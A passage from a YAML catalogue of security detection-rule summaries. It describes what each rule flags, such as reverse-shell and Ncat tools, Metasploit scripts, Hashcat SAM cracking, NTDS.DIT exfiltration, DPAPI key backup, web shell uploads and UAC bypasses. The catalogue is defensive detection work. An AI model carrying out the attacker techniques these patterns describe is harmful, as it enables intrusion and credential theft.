    DNS query activities associated with Regsvr32.exe can help in identifying potential
    misuse or suspicious behavior indicative of malicious activity.
  Updated-Date: '2024_09_04'
36e35854-a11d-408d-a918-9d0fe7567766:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0b065fd97d6bfed72e1b7ece203b6f2b
  Ruleset: securityonion-resources
  Summary: This rule detects when a login attempt is made on the Telnet service of
    a Security Onion Intrusion Detection Honeypot (IDH) node, an action typically
    indicating potential unauthorized access attempts.
  Updated-Date: '2024_08_07'
36fbec91-fa1b-4d5d-8df1-8d8edcb632ad:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2287b711136a8a89060b5ff550425109
  Ruleset: core
  Summary: This rule detects code execution via Microsoft Office Add-ins, specifically
    focusing on XLL files. Adversaries may exploit Office add-ins to establish persistence
    on a compromised system by leveraging functionalities within Office programs.
    The detection is based on the presence of specific script block text associated
    with creating new objects, COM objects, application instances, and the RegisterXLL
    method.
  Updated-Date: '2024_09_03'
3711eee4-a808-4849-8a14-faf733da3612:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b88aa7eb12fe5d525b865bbf131a26ce
  Ruleset: emerging-threats
  Summary: This rule detects tools and process executions associated with the Greenbug
    espionage group during their campaign in May 2020, as reported by Symantec. It
    identifies specific file paths and executables used by the group, such as `Adobe.exe`,
    `local.exe`, `revshell.exe`, `ncat.exe`, and `comms.exe`. It also monitors for
    command lines containing certain parameters indicating the use of Metasploit (`msf.ps1`),
    Ncat, and suspicious PowerShell commands that bypass execution policies, invoke
    SQL data adapters, manage web clients, or query system credentials. Additionally,
    it detects the presence of base64-encoded server configurations in command lines.
  Updated-Date: '2024_09_03'
3735d5ac-d770-4da0-99ff-156b180bc600:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2d67fe2f1758fc7fb71e0249174c18a1
  Ruleset: sigmahq
  Summary: This rule detects potential DLL sideloading of "CCleanerReactivator.dll."
    DLL sideloading is a tactic used by malicious actors to execute arbitrary code
    through a legitimate Windows process by placing a malicious DLL in the same directory
    as an executable. The rule specifically monitors for instances where "CCleanerReactivator.dll"
    is loaded by any process other than those located in the standard "C:\Program
    Files\CCleaner\" or "C:\Program Files (x86)\CCleaner\" directories and executed
    by "CCleanerReactivator.exe," indicating suspicious activity. This can be part
    of attack strategies involving defense evasion, persistence, and privilege escalation.
    Potential false positives might occur if the DLL is loaded from custom installation
    paths, thus additional context-specific filters might be required.
  Updated-Date: '2024_09_04'
37379ef6-95e7-4025-bd19-f751e9e41e06:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8bc5210f41af91e7f77a36133e9d6e49
  Ruleset: securityonion-resources
  Summary: This rule detects when a user fails to login to a grid node via the console
    on a Linux system. It specifically monitors authentication logs for failed login
    attempts where the process name is 'login' and associates these events with grid
    nodes by checking for specific tags. This detection helps identify possible unauthorized
    access attempts and ensures security monitoring for grid node logins.
  Updated-Date: '2024_08_07'
37651c2a-42cd-4a69-ae0d-22a4349aa04a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2e51fa0f39d2a39cf338d8f239b81270
  Ruleset: sigmahq
  Summary: This rule detects attempts to install unsigned AppX packages using the
    "Add-AppxPackage" or its alias "Add-AppPackage" cmdlets. These activities are
    identified through commands executed by PowerShell or PowerShell Core, especially
    when the command line includes the flag '-AllowUnsigned'. Such behavior might
    indicate persistence or defense evasion techniques on a Windows system. Detection
    focuses on process creation logs where these specific command lines are found.
  Updated-Date: '2024_09_04'
37774c23-25a1-4adb-bb6d-8bb9fd59c0f8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4d84eb5d21d9a6b8a54a0f6687eef026
  Ruleset: core
  Summary: This rule detects the loading of the Volume Shadow Copy Service library
    (vssapi.dll) by unusual executables. This activity is flagged to identify potential
    malicious behavior such as defense evasion and impact techniques, specifically
    those related to manipulating shadow copies. The rule filters out common, benign
    processes from Windows system directories, common installers, standard Program
    Files directories, and the ProgramData Package Cache, which could otherwise generate
    false positives. The objective is to isolate and alert on suspicious instances
    where processes that typically would not require access to vssapi.dll are seen
    loading this library.
  Updated-Date: '2024_09_03'
377f33a1-4b36-4ee1-acee-1dbe4b43cfbe:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e21bdb8e3fa6cba7788d60b54170971f
  Ruleset: sigmahq
  Summary: 'This rule detects suspicious VSFTPD error messages that may indicate a
    fatal or suspicious error potentially caused by exploit attempts. These errors
    include messages such as "Connection refused: too many sessions for this address,"
    "Connection refused: tcp_wrappers denial," "Bad HTTP verb," issues with both "port
    and pasv" being active, failed directory transfers, file modification issues,
    and various abnormal or failed system calls. Such errors could signify attempts
    to exploit vulnerabilities in the VSFTPD service on Linux systems.'
  Updated-Date: '2024_09_04'
378a05d8-963c-46c9-bcce-13c7657eac99:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cb45c9d347c6a729cf4edee980fe14a5
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious CommandLine arguments associated
    with Electron-based applications such as Teams, Discord, Slack, and others. These
    unusual CommandLine parameters may indicate an attempt to misuse these applications
    to execute commands through a signed binary, which could be a sign of malicious
    activity. The rule identifies Electron applications by their executable names
    and specific CommandLine arguments that are typical for such applications but
    may be used in a way that could suggest exploitation or proxy execution.
  Updated-Date: '2024_09_04'
37b437cf-3fc5-4c8e-9c94-1d7c9aff842b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 247e43125de12222a88c55112952d359
  Ruleset: sigmahq
  Summary: This rule detects when the Remote Desktop Protocol (RDP) Remote Assistance
    feature is enabled to allow specific users to connect remotely to a targeted machine.
    This is identified by monitoring changes in the system registry, specifically
    the modification of the 'fAllowToGetHelp' entry under 'System\CurrentControlSet\Control\Terminal
    Server' to a DWORD value of 0x00000001, which indicates that the feature has been
    enabled. While legitimate use of this feature is possible, all alerts generated
    by this rule should be investigated.
  Updated-Date: '2024_09_04'
37c1333a-a0db-48be-b64b-7393b2386e3b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 80ad0fbf012f67446570257d0571152e
  Ruleset: core
  Summary: This rule detects the execution of various Windows-based hacktools through
    examination of the Portable Executable (PE) metadata, specifically focusing on
    company and product information. It identifies tools produced by the hacktool
    developer known as "Cube0x0," which includes the handle "Cube0x0" in the company
    information of all their binaries. The rule aims to detect well-known tools like
    SharpPrintNightmare, KrbRelay, and SharpMapExec, even if these files have been
    renamed. The detection ensures high reliability due to the specific nature of
    the metadata.
  Updated-Date: '2024_09_03'
37db85d1-b089-490a-a59a-c7b6f984f480:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e95187c2d36f960067c957f635813536
  Ruleset: core
  Summary: This rule detects the use of "findstr" with the argument "385201," which
    may indicate an attempt to discover an installed Sysinternals Sysmon service using
    the default driver altitude. Sysinternals Sysmon is a system monitoring tool that
    logs system activity to the Windows event log. This specific detection focuses
    on the command lines that include '385201', as this value is associated with the
    default driver altitude of Sysmon, regardless of whether the service name has
    been altered.
  Updated-Date: '2024_09_03'
37dc5463-f7e3-4f61-ad76-ba59cd02a651:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5f02165aad95720efca731d92c9882d8
  Ruleset: emerging-threats
  Summary: This rule detects a PowerShell script used by the Lace Tempest advanced
    persistent threat (APT) group to initiate their malware loader by exploiting the
    CVE-2023-47246 vulnerability, as reported by SysAid Team. The detection relies
    on specific script block text patterns within Windows PowerShell script logging,
    which must be enabled to capture this activity. Key indicators include paths like
    "\SysAidServer\tomcat\webapps" and commands related to "user.exe" and "Remove-Item
    -Force".
  Updated-Date: '2024_09_03'
37e4024a-6c80-4d8f-b95d-2e7e94f3a8d1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3b1352b79ced3ca87722b65015b915a2
  Ruleset: sigmahq
  Summary: This rule detects outbound network connections initiated by Microsoft Dialer,
    a built-in utility application in various Microsoft Windows versions. The primary
    function of Microsoft Dialer is to manage phone calls via a modem or a phone line
    connected to the computer. In contemporary contexts, this process is considered
    outdated and is often targeted by info-stealing malware for process injection,
    enabling malicious Command and Control (C2) connections. Rhadamanthys is a notable
    example of such malware exploiting this process. The detection mechanism focuses
    on instances where the dialer executable initiates outbound network connections,
    excluding local network ranges to reduce false positives.
  Updated-Date: '2024_09_04'
37e8369b-43bb-4bf8-83b6-6dd43bda2000:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0b2e8e51354a4ca8b453cae63c4629cd
  Ruleset: emerging-threats
  Summary: This rule detects access to a webshell placed within the keystore folder
    on a WebLogic server. Accessing such webshells typically indicates exploitation
    linked to CVE-2018-2894, where malicious actors may leverage this to achieve initial
    access and maintain persistence within the system. The detection mechanism identifies
    specific URI queries targeting JavaScript files within the keystore directory.
  Updated-Date: '2024_09_03'
37e8d358-6408-4853-82f4-98333fca7014:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 697a06440920e4324c6f5fd1d105927d
  Ruleset: sigmahq
  Summary: This rule detects the execution of the NetSupport Remote Access Tool (RAT)
    client32.exe from an unusual location on a Windows system, specifically outside
    of the 'C:\Program Files' or 'C:\Program Files (x86)' directories. NetSupport
    is used for remote control and management of computers but can be misused by malicious
    actors to evade defenses. The rule identifies instances where this executable
    runs from non-standard directories, suggesting potential unauthorized or malicious
    use.
  Updated-Date: '2024_09_04'
38646daa-e78f-4ace-9de0-55547b2d30da:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 51e1ed29a842c099d16cc0d3984e1db5
  Ruleset: core
  Summary: This rule detects the execution of the reconnaissance tool Seatbelt by
    analyzing process creation logs on Windows systems for specific command line parameters
    and metadata associated with the Seatbelt executable. Seatbelt is commonly used
    for system information gathering, focusing on elements like DPAPI master keys,
    interesting running processes and files, certificate thumbprints, browsing history
    in Chromium and Firefox, cloud credentials, and process creation events. The rule
    is designed to identify the presence of Seatbelt through specific command line
    groups and output file parameters to minimize false positives.
  Updated-Date: '2024_09_03'
38825179-3c78-4fed-b222-2e2166b926b1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 42156dd63db1709be74ce3b0945605f9
  Ruleset: emerging-threats
  Summary: This rule detects potential exploitation attempts of the CVE-2021-26084
    vulnerability, which is a Confluence remote code execution (RCE) issue using Object-Graph
    Navigation Language (OGNL) injection. The rule examines web server POST requests
    resulting in a 200 status code, sent by an anonymous user, targeting specific
    URI patterns and query strings indicative of the exploit attempts. Specifically,
    it checks for particular endpoints and parameter values that signal OGNL payloads.
    This detection method aims to identify and mitigate the initial access attempts
    related to this critical Confluence vulnerability.
  Updated-Date: '2024_09_03'
3883d9a0-fd0f-440f-afbb-445a2a799bb8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6b37f1dae99e0ed944e88910a9f3e0f3
  Ruleset: sigmahq
  Summary: This rule detects the disabling of the secret scanning feature in either
    an enterprise or repository on GitHub. Secret scanning helps identify and prevent
    the exposure of sensitive data such as passwords or API keys within a repository.
    The detection triggers if any actions related to disabling this feature occur,
    indicating potential security risks or configuration changes that may undermine
    repository security.
  Updated-Date: '2024_09_04'
38879043-7e1e-47a9-8d46-6bec88e201df:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 62be34aa9adbb1f4a2400e3c00faa894
  Ruleset: sigmahq
  Summary: This rule detects the modification of an existing Windows service to execute
    an arbitrary payload, which can be used as a method for persistence. It identifies
    commands that use 'sc' to configure service bin paths or failure commands, and
    'reg' commands that add failure commands or image paths, often followed by script
    or executable files. This type of tampering is recognized as a common persistence
    technique used in cyber attacks.
  Updated-Date: '2024_09_04'
38a7625e-b2cb-485d-b83d-aff137d859f4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e8bbbc9c060e9655e07842e4ae61bd29
  Ruleset: core
  Summary: This rule detects the creation of a PowerShell module where the module
    contents include the function "Get-VMRemoteFXPhysicalVideoAdapter". This activity
    may indicate potential abuse of the "RemoteFXvGPUDisablement.exe" binary, which
    is susceptible to module load-order hijacking.
  Updated-Date: '2024_09_03'
38e7f511-3f74-41d4-836e-f57dfa18eead:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0c0a13b2d5c85d516f44aec274adbe33
  Ruleset: sigmahq
  Summary: This rule detects the successful execution of commands against an instance
    using AWS CloudTrail's System Manager. This is identified by monitoring 'SendCommand'
    events originating from the 'ssm.amazonaws.com' event source, specifically when
    the response indicates a successful command status. This activity could indicate
    potential privilege escalation or initial access attempts, although legitimate
    administrative actions may also trigger these events.
  Updated-Date: '2024_09_04'
38eb1dbb-011f-40b1-a126-cf03a0210563:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3df830f3a4db2c29a6d06b0113b6ceb0
  Ruleset: sigmahq
  Summary: This rule detects changes to the ESXi syslog configuration executed via
    the "esxcli" command-line interface. Specifically, it identifies activities where
    the command includes the parameters 'system', 'syslog', 'config', and 'set'. This
    can indicate potential defense evasion tactics where an adversary might modify
    logging settings to cover their tracks. However, such changes could also result
    from legitimate administrative tasks.
  Updated-Date: '2024_09_04'
39019a4e-317f-4ce3-ae63-309a8c6b53c5:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 574de1630696fcd744a855d9b672d9c8
  Ruleset: core
  Summary: This rule detects the creation of scheduled tasks on a Windows system that
    involve the Temp folder and are configured to run only once. The detection focuses
    on processes where the image path ends with `schtasks.exe` and the command line
    includes specific parameters such as `/create`, `/sc once`, and a reference to
    the Temp directory. This behavior is often associated with malicious activity,
    although it can also occur during legitimate administrative tasks or software
    installations.
  Updated-Date: '2024_09_03'
39466c42-c189-476a-989f-8cdb135c163a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 800f3709b0d8e2bad9c59e70cfaadfaf
  Ruleset: emerging-threats
  Summary: This rule detects the creation of filenames containing specific indicators
    associated with the Small Sieve malware, particularly focusing on a typo ("Microsift")
    and specific file paths used by the malware. The detection criteria include files
    situated in user directories such as "\Users\" and "\AppData\", with subdirectories
    "\Roaming\" and "\Local\". Additionally, it flags files ending with the path "\AppData\Local\MicrosoftWindowsOutlookDataPlus.txt."
    These indicators align with defense evasion techniques and emerging threats.
  Updated-Date: '2024_09_03'
395907ee-96e5-4666-af2e-2ca91688e151:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7bd7ff200f6c8fafe06ffcef39ee5667
  Ruleset: core
  Summary: This rule detects the execution of `wab.exe` (Windows Contacts) and `Wabmig.exe`
    (Microsoft Address Book Import Tool) from non-default locations. The observation
    is based on the activity pattern associated with the Bumblebee malware. The detection
    is based on the creation of these processes outside their expected directories
    (`C:\Windows\WinSxS\`, `C:\Program Files\Windows Mail\`, and `C:\Program Files
    (x86)\Windows Mail\`). This anomaly may indicate potential malicious activity
    leveraging these executables for defense evasion or execution purposes.
  Updated-Date: '2024_09_03'
39698b3f-da92-4bc6-bfb5-645a98386e45:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 35240e93a0366b0280a7c97b231dddcb
  Ruleset: core
  Summary: This rule detects the presence of a suspicious computer name pattern "samtheadmin-{1..100}$"
    generated by a hack tool. It specifically looks for account names that start with
    "SAMTHEADMIN-" and end with "$" in the security event logs within Windows systems.
    The detection aims to identify potential misuse related to CVE-2021-42278 and
    CVE-2021-42287 exploits, which are associated with attacks on persistence, privilege
    escalation, or unauthorized account usage.
  Updated-Date: '2024_09_03'
396ae3eb-4174-4b9b-880e-dc0364d78a19:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 25b6df7a9f588151fa00995c6752a43a
  Ruleset: core
  Summary: This rule detects the modification of the Outlook setting "LoadMacroProviderOnBoot."
    Enabling this setting allows the automatic loading of any configured VBA project
    or module, which can be exploited for persistence mechanisms within the Outlook
    application on Windows systems.
  Updated-Date: '2024_09_03'
396f6630-f3ac-44e3-bfc8-1b161bc00c4e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 561c62aa67f70755e6f31e2d33cde7d2
  Ruleset: sigmahq
  Summary: This rule detects suspicious child processes spawned by the Windows Error
    Reporting manager (wermgr.exe). Common legitimate child processes of wermgr.exe
    include various system utilities such as cmd.exe, cscript.exe, ipconfig.exe, mshta.exe,
    net.exe, net1.exe, netstat.exe, nslookup.exe, powershell.exe, powershell_ise.exe,
    pwsh.exe, regsvr32.exe, rundll32.exe, systeminfo.exe, whoami.exe, and wscript.exe.
    The rule includes a filter to exclude legitimate rundll32.exe processes associated
    with WerConCpl.dll for error reporting. Detection of these suspicious activities
    may indicate attempts at defense evasion or privilege escalation tactics.
  Updated-Date: '2024_09_04'
39a80702-d7ca-4a83-b776-525b1f86a36d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 183de151824f32e82ea186dc0f34b59b
  Ruleset: sigmahq
  Summary: This rule detects the renaming of a file during its deletion using the
    SDelete tool. SDelete (Secure Delete) is a utility from Sysinternals that securely
    deletes files by overwriting a file's data, making recovery difficult. The rule
    monitors for specific event IDs indicating file operations in Windows Security
    logs, focusing on file names with extensions like ".AAA" and ".ZZZ", which are
    commonly associated with the SDelete tool's renaming process before deletion.
  Updated-Date: '2024_09_04'
39a94fd1-8c9a-4ff6-bf22-c058762f8014:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ee43dfb2df77acc3760172e2f3707818
  Ruleset: sigmahq
  Summary: "This rule detects attempts to backup the DPAPI (Data Protection API) Master\
    \ Key, which are activities that generate specific events at the source rather\
    \ than the Domain Controller. This can be linked to credential access tactics,\
    \ particularly with the use of event ID 4692 in Windows Security logs. The detection\
    \ focuses on capturing key attributes such as the computer name, domain name,\
    \ and username associated with the event. Such activities may be legitimate due\
    \ to the DPAPI\u2019s backup mechanism in domain environments but should be scrutinized\
    \ for potential security implications."
  Updated-Date: '2024_09_04'
39ac1fb0-07f1-474b-b97e-c5c0eace0d79:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dd6ace3f93387fdf2ebbe62d5ac77757
  Ruleset: emerging-threats
  Summary: This rule detects the execution of "csc.exe" by the "w3wp.exe" process,
    associated with the MOVEit Transfer application. MOVEit is impacted by a critical
    vulnerability allowing hosts to dynamically compile malicious DLL files. Evidence
    of such activity includes DLL files written under specific paths within the C:\\Windows\\Microsoft\.NET
    directory. Notably, this activity involves IIS dynamically compiling binaries
    via "csc.exe" on behalf of MOVEit, especially incidents post-May 27th, indicating
    potential exploitation of the vulnerability.
  Updated-Date: '2024_09_03'
39ae3791-133c-4beb-bdf7-559e7a4cd428:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ed944d7f7bd56b6ea7c50dea2ba5f83f
  Ruleset: securityonion-resources
  Summary: This rule detects instances where an attempt is made to execute an action
    command on a REDIS service running on an OpenCanary node. OpenCanary is a honeypot
    framework designed to emulate various network services for intrusion detection
    purposes. The rule identifies such attempts by monitoring specific log types generated
    by OpenCanary.
  Updated-Date: '2024_08_07'
39b31e81-5f5f-4898-9c0e-2160cfc0f9bf:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7cade10916a5a4a74b64b6cc6a1febbb
  Ruleset: core
  Summary: This rule detects the execution of Hashcat.exe, a password recovery tool,
    specifically when it is utilized to crack passwords from a Windows Security Account
    Manager (SAM) file with a provided password list. It looks for specific command-line
    parameters that indicate Hashcat is being used for this purpose, focusing on the
    presence of '-a ', '-m 1000 ', and '-r ' arguments. This is relevant for identifying
    attempts at credential access through password cracking on Windows systems.
  Updated-Date: '2024_09_03'
39b64854-5497-4b57-a448-40977b8c9679:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8f56fc6f23fb9c50c8e43e12fcc547de
  Ruleset: sigmahq
  Summary: This rule detects the loading of known malicious drivers by examining the
    file names of the drivers. It targets specific driver files that are recognized
    as malicious, including, but not limited to, 'wfshbr64.sys', 'ktmutil7odm.sys',
    'ktes.sys', 'malicious.sys', 'gmer64.sys', and 'mimikatz.sys'. These drivers are
    associated with various types of malicious activity, such as privilege escalation
    and known vulnerabilities. The detection relies on identifying the exact file
    names of these drivers when they are loaded on a Windows system. False positives
    may occur if a legitimate driver has the same name as a malicious one, so validation
    of the driver's legitimacy and version is crucial.
  Updated-Date: '2024_09_04'
39ed3c80-e6a1-431b-9df3-911ac53d08a7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1b9309669281af21367a548c6b6be1dd
  Ruleset: core
  Summary: This rule detects patterns consistent with a User Account Control (UAC)
    bypass method using NTFS reparse points and DLL hijacking through the executable
    `wusa.exe`. Specifically, it monitors for certain command line arguments indicating
    the execution of `wusa.exe` with high integrity levels interacting with files
    in a user's temporary directory, such as "C:\Users\...\AppData\Local\Temp\update.msu".
    It also identifies specific command line activity involving `dism.exe` and `DismHost.exe`
    suggesting exploitation attempts. Such tactics are linked to known bypass techniques
    labeled as UACMe 36.
  Updated-Date: '2024_09_03'
39f1f9f2-9636-45de-98f6-a4046aa8e4b9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f5b75fe4dc364690b4e44a921106f2da
  Ruleset: sigmahq
  Summary: This rule detects the creation of files with certain extensions, such as
    .ashx, .asp, .ph, and .soap, in the directories associated with static websites,
    including paths like `inetpub\wwwroot\`, `www`, `htdocs`, and `html`. These activities
    can indicate potential web shell uploads, which are malicious scripts used for
    remote access and control over a web server. Detection also considers filtering
    out temporary paths and common system processes to reduce false positives, ensuring
    that legitimate administrative or development actions creating executable files
    in these directories are not mistakenly flagged.
  Updated-Date: '2024_09_04'
39f919f3-980b-4e6f-a975-8af7e507ef2b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 564f07f9d17a94a158ceab295ae6cff1
  Ruleset: core
  Summary: This rule detects events from the Kernel-General ETW indicating that the
    access bits of a set of registry hives, specifically with system-related names
    located in the temporary directory, have been reset. This activity commonly occurs
    when an application attempts to access a hive that has not been recognized in
    the past seven days, by default. Such behavior is often associated with registry
    hive dumping utilities like QuarksPwDump, which are used for credential dumping.
  Updated-Date: '2024_09_03'
3a3f81ca-652c-482b-adeb-b1c804727f74:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ad2c3a11d3b9ac1f8d4365112384ad01
  Ruleset: emerging-threats
  Summary: This rule detects file indicators associated with a 2018 phishing campaign
    attributed to APT29, also known as Cozy Bear. Specifically, it monitors for files
    with names such as 'ds7002.lnk', 'ds7002.pdf', and 'ds7002.zip', which were reported
    by Mandiant in their analysis of the campaign. This detection aims to identify
    attempts by APT29 to evade defenses and indicators of a targeted phishing attack.
  Updated-Date: '2024_09_03'
3a6586ad-127a-4d3b-a677-1e6eacdf8fde:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0df7cc9aa8390a7635aa84cf25d0ad91
  Ruleset: core
  Summary: This rule detects suspicious child processes originating from Windows shell
    and scripting processes such as wscript, rundll32, powershell, and mshta. It focuses
    on identifying abnormal activities like the spawning of programs typically associated
    with system administration and network communication tools, including schtasks.exe,
    nslookup.exe, certutil.exe, and bitsadmin.exe. Filters are employed to exclude
    benign activities related to legitimate software such as Amazon Workspaces and
    Tenable Nessus Vulnerability Scanner to reduce false positives. Specific conditions
    are set to ensure that system and administrative maintenance scripts do not trigger
    unwanted alerts.
  Updated-Date: '2024_09_03'
3a734d25-df5c-4b99-8034-af1ddb5883a4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d5f6ab36b76ae82a655ab22f8cb55895
  Ruleset: core
  Summary: This rule detects suspicious scheduled task creation events on Windows
    systems. It monitors for event ID 4698 and checks if scheduled tasks are created
    within specific paths such as "\AppData\Local\Temp\", "\AppData\Roaming\", "\Users\Public\",
    and others commonly used by attackers for persistence. Additionally, it looks
    for suspicious commands within the task content, including the use of "regsvr32",
    "rundll32", "cmd.exe", "powershell", "mshta", "wscript", and various other executable
    files and commands that might indicate malicious activity.
  Updated-Date: '2024_09_03'
3a8da4e0-36c1-40d2-8b29-b3e890d5172a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3698ce68a7bc69d490c5034188397f55
  Ruleset: core
  Summary: This rule detects the creation of files with specific name patterns that
    are associated with the exfiltration of the NTDS.DIT database. These patterns
    are typically used in various tools designed to export this critical database,
    which contains information used for credential access. The rule monitors for filenames
    ending with "\All.cab" or ".ntds.cleartext" as indicators of such activity.
  Updated-Date: '2024_09_03'
3a9fa2ec-30bc-4ebd-b49e-7c9cff225502:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c1b52011faabd9f35911dcac68c231b4
  Ruleset: sigmahq
  Summary: This rule detects the creation or modification of a PowerShell profile
    related to Visual Studio Code (VSCode), which could signify suspicious activity.
    Such a profile can be utilized as a persistence mechanism, potentially facilitating
    unauthorized access or privilege escalation.
  Updated-Date: '2024_09_04'
3ab65069-d82a-4d44-a759-466661a082d1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 632417c59c4cc79d2221d0ab55c85df1
  Ruleset: sigmahq
  Summary: This rule detects an executable initiating a network connection to LocaltoNet
    tunneling sub-domains. LocaltoNet is a reverse proxy service that allows localhost
    services to be exposed to the Internet. Attackers have been known to use this
    service for command-and-control activities to bypass multi-factor authentication
    (MFA) and perimeter controls.
  Updated-Date: '2024_09_04'
3ab79e90-9fab-4cdf-a7b2-6522bc742adb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c91a1bb62be7109af11530f15e9c080b
  Ruleset: sigmahq
  Summary: This rule detects the creation of files with specific names, such as 'sam.tmp',
    'sec.tmp', and 'sys.tmp' in the Windows Temp directory, which are used by the
    RemoteKrbRelay SMB Relay attack module. The rule aims to identify potential indicators
    of a RemoteKrbRelay SMB Relay attack, targeting vulnerabilities in Windows to
    facilitate unauthorized access and secrets dumping.
  Updated-Date: '2024_09_04'
3abd6094-7027-475f-9630-8ab9be7b9725:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2319069041e5c6b755a04dedd3258b47
  Ruleset: sigmahq
  Summary: This rule detects when a Windows administrative share is mounted via the
    command-line utility net.exe. It identifies the use of administrative shares,
    which are special network shares created by the Windows operating system for remote
    management. The detection focuses on certain command patterns and specific file
    names associated with net.exe and net1.exe. This type of activity is often associated
    with lateral movement techniques and could indicate suspicious attempts to access
    administrative shares within a network.
  Updated-Date: '2024_09_04'
3ae1a046-f7db-439d-b7ce-b8b366b81fa6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9666745bd5af951fcebc6070ebb156a3
  Ruleset: sigmahq
  Summary: This rule detects a change where the registry 'UseActionCenterExperience'
    is set to 0, effectively disabling Windows Security Center notifications. This
    action is associated with defense evasion tactics as it prevents the user from
    receiving security alerts.
  Updated-Date: '2024_09_04'
3aff0be0-7802-4a7e-a4fa-c60c74bc5e1d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4a3565c5f9c92d9e71906cea62cb679a
  Ruleset: core
  Summary: This rule detects the setting of a custom URL for OneDriveStandaloneUpdater.exe,
    which is typically used to download files from the Internet. Instead of executing
    any anomalous executables with suspicious arguments, the downloaded file will
    be stored in the specific directory C:\Users\redacted\AppData\Local\Microsoft\OneDrive\StandaloneUpdaterreSignInSettingsConfig.json.
    This activity is identified by monitoring changes in the Windows registry entry
    related to OneDrive's update configurations. This detection method is particularly
    relevant for identifying potential command-and-control attacks or unauthorized
    downloads.
  Updated-Date: '2024_09_03'
3b2c1059-ae5f-40b6-b5d4-6106d3ac20fe:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5a46dea67f14d5de74d55dab9f811673
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "chflags" utility with the "hidden"
    flag on MacOS. This action is used to hide files or directories, making them invisible
    to the default file listing commands and graphical file browsers. This technique
    can be part of defense evasion tactics by various malware, such as the multi-stage
    MacOS Trojan discussed in reports by SentinelOne, or updates to the OceanLotus
    malware. Legitimate usage by administrators and users can result in false positives.
  Updated-Date: '2024_09_04'
3b3c7f55-f771-4dd6-8a6e-08d057a17caf:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
